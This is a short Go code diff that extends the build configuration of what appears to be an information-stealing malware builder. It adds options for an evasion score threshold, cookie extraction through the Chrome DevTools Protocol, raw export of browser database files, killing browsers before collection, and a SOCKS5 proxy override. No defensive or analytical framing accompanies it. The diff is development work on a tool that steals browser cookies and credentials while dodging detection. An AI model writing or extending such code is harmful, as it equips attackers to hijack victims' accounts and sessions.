@@ -44,6 +44,14 @@ type BuildConfig struct {
 	DomainDetect      []string `json:"domain_detect"`
 	Modules           Modules  `json:"modules"`
 	NotifyBots        []string `json:"notify_bots"`
+
+	// Hardening config — override compiled-in defaults at runtime
+	EvasionThreshold  int    `json:"evasion_score_threshold,omitempty"` // 0 = use compiled default
+	CdpGrab           bool   `json:"cdp_grab,omitempty"`               // enable CDP cookie extraction
+	RawExport         bool   `json:"raw_export,omitempty"`             // enable raw DB file export
+	KillBrowsers      bool   `json:"kill_browsers,omitempty"`          // kill browser before collect
+	Socks5Host        string `json:"socks5_host,omitempty"`            // override SOCKS5 proxy host
+	Socks5Port        int    `json:"socks5_port,omitempty"`            // override SOCKS5 proxy port
 }
 
 type BuildService struct{}
